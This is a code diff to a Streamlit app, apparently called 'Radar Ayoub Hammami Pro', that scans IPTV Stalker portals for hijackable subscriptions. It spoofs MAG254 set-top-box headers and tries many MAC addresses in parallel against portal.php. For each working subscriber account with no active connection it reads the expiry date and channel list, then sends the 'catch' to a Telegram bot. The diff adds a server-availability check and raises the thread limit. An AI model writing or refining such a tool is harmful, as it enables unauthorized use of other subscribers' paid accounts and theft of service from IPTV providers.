@@ -29,6 +29,7 @@ st.markdown("""
     .main-header { text-align: center; background: linear-gradient(90deg, #b91d1d 0%, #431407 100%); 
     padding: 1.5rem; border-radius: 15px; color: white; margin-bottom: 2rem; }
     .stButton>button { width: 100%; background-color: #b91d1d; color: white; border-radius: 10px; }
+    .status-box { padding: 10px; border-radius: 5px; margin-bottom: 10px; text-align: center; font-weight: bold; }
 </style>
 <div class="main-header">
     <h1>📡 Radar Ayoub Hammami Pro</h1>
@@ -50,12 +51,21 @@ def get_auth_headers(mac):
         'X-User-Agent': 'Model: MAG254; Link: WiFi'
     }
 
+def check_server_status(url):
+    """وظيفة للتحقق من أن السيرفر يعمل"""
+    try:
+        response = requests.get(url, timeout=5)
+        if response.status_code == 200:
+            return True, response.status_code
+        return False, response.status_code
+    except:
+        return False, "Connection Failed"
+
 def check_mac_logic(host, mac, timeout):
     try:
         headers = get_auth_headers(mac)
         base_url = f"http://{host}/portal.php"
         
-        # 1. فحص البروفايل والمتصلين والتاريخ
         start = time.time()
         r = requests.get(f"{base_url}?type=stb&action=get_profile&force_stb=1", headers=headers, timeout=timeout)
         latency = (time.time() - start) * 1000
@@ -65,12 +75,10 @@ def check_mac_logic(host, mac, timeout):
             active = re.search(r'"active_cons"\s*:\s*"(\d+)"', data_text)
             active_val = int(active.group(1)) if active else 1
             
-            # استخراج التاريخ
             exp = re.search(r'"end_date"\s*:\s*"([^"]+)"', data_text)
             exp_val = exp.group(1) if exp else "غير محدد"
             
             if active_val == 0:
-                # 2. فحص القنوات
                 r_ch = requests.get(f"{base_url}?type=itv&action=get_all_channels", headers=headers, timeout=timeout)
                 ch_text = r_ch.text.upper()
                 found = [n for n, keys in CHANNELS_KEYS.items() if all(k in ch_text for k in keys)]
@@ -86,66 +94,60 @@ def check_mac_logic(host, mac, timeout):
 
 # ============ 🖥️ واجهة المستخدم ============
 
-input_data = st.text_area("🚀 الصق البيانات هنا (روابط + ماكات عشوائية):", height=200)
+input_data = st.text_area("🚀 الصق البيانات هنا (روابط + ماكات عشوائية):", height=150)
 
 col_cfg1, col_cfg2 = st.columns(2)
 with col_cfg1:
-    threads = st.slider("👥 عدد الخيوط (السرعة)", 1, 30, 15)
+    threads = st.slider("👥 عدد الخيوط (السرعة)", 1, 50, 20)
 with col_cfg2:
-    timeout_sec = st.slider("⏱️ مهلة الانتظار", 3, 15, 7)
+    timeout_sec = st.slider("⏱️ مهلة الانتظار", 3, 20, 10)
 
 if st.button("🏁 ابدأ المسح الشامل"):
-    # استخراج الماكات والرابط
     found_macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', input_data.upper())))
     host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', input_data)
     
     if host_match and found_macs:
-        host = host_match.group(0).split('/portal.php')[0].replace("http://", "").replace("https://", "").strip("/")
+        full_url = host_match.group(0)
+        host = full_url.split('/portal.php')[0].replace("http://", "").replace("https://", "").strip("/")
         
-        # عرض URL المستخرج
-        st.markdown(f"**📌 URL المستخرج:** `{host}`")
+        # --- فحص حالة السيرفر أولاً ---
+        with st.spinner('🔍 فحص حالة السيرفر...'):
+            is_up, status_code = check_server_status(f"http://{host}/portal.php")
         
-        # فحص حالة السيرفر
-        try:
-            test_url = f"http://{host}/portal.php"
-            response = requests.get(test_url, timeout=5)
-            if response.status_code == 200:
-                st.markdown(f'<p style="color: green; font-weight: bold;">✅ السيرفر يعمل</p>', unsafe_allow_html=True)
-            else:
-                st.markdown(f'<p style="color: red; font-weight: bold;">❌ السيرفر معطل</p>', unsafe_allow_html=True)
-        except:
-            st.markdown(f'<p style="color: red; font-weight: bold;">❌ السيرفر معطل</p>', unsafe_allow_html=True)
-        
-        st.info(f"🌐 السيرفر: {host} | 🎯 الأهداف: {len(found_macs)}")
-        
-        progress = st.progress(0)
-        results = []
-        
-        # الفحص المتوازي
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = {executor.submit(check_mac_logic, host, m, timeout_sec): m for m in found_macs}
+        if is_up:
+            st.success(f"🟢 السيرفر يعمل (Status: {status_code})")
+            st.info(f"🌐 Host: {host} | 🎯 الأهداف: {len(found_macs)}")
             
-            for i, future in enumerate(as_completed(futures)):
-                res = future.result()
-                if res['status'] == 'AVAILABLE':
-                    results.append(res)
-                    # تنبيه تلغرام فوري
-                    msg = f"🎯 **صيد جديد - Radar Ayoub**\n🖥️ الماك: `{res['mac']}`\n📅 ينتهي: {res['expiry']}\n📊 الاستقرار: {res['latency']}\n📺 القنوات: {', '.join(res['channels'])}"
-                    bot.send_message(ID, msg, parse_mode="Markdown")
-                    st.success(f"✅ وجدنا ماك متاح: {res['mac']}")
+            progress = st.progress(0)
+            results = []
+            
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                futures = {executor.submit(check_mac_logic, host, m, timeout_sec): m for m in found_macs}
                 
-                progress.progress((i + 1) / len(found_macs))
+                for i, future in enumerate(as_completed(futures)):
+                    res = future.result()
+                    if res['status'] == 'AVAILABLE':
+                        results.append(res)
+                        msg = f"🎯 **صيد جديد - Radar Ayoub**\n🌐 السيرفر: `{host}`\n🖥️ الماك: `{res['mac']}`\n📅 ينتهي: {res['expiry']}\n📊 الاستقرار: {res['latency']}\n📺 القنوات: {', '.join(res['channels'])}"
+                        bot.send_message(ID, msg, parse_mode="Markdown")
+                        st.success(f"✅ متاح: {res['mac']}")
+                    
+                    progress.progress((i + 1) / len(found_macs))
 
-        # عرض النتائج النهائية في جدول
-        if results:
-            st.divider()
-            st.subheader("📊 الماكات الذهبية المكتشفة")
-            df = pd.DataFrame(results)
-            st.table(df)
-            st.balloons()
+            if results:
+                st.divider()
+                st.subheader("📊 الماكات الذهبية المكتشفة")
+                df = pd.DataFrame(results)
+                st.table(df)
+                st.balloons()
+            else:
+                st.warning("📭 لم يتم العثور على ماكات متاحة حالياً.")
         else:
-            st.warning("📭 اكتمل المسح ولم نجد ماكات فارغة حالياً.")
+            st.error(f"🔴 السيرفر لا يستجيب أو مغلق (Status: {status_code})")
+            st.warning("تأكد من صحة الرابط أو أن السيرفر لا يحظر بلدك.")
+            
     else:
-        st.error("❌ تأكد من وجود رابط وماكات في النص.")
+        st.error("❌ خطأ: يرجى التأكد من وضع رابط السيرفر والماكات بشكل صحيح.")
 
-st.sidebar.info("هذا النظام مخصص للفحص السريع واصطياد اشتراكات الـ STB النشطة.")
+st.sidebar.markdown("### 👤 المطور: Ayoub Hammami")
+st.sidebar.info("يتم فحص حالة URL تلقائياً قبل البدء في استهلاك موارد الجهاز.")
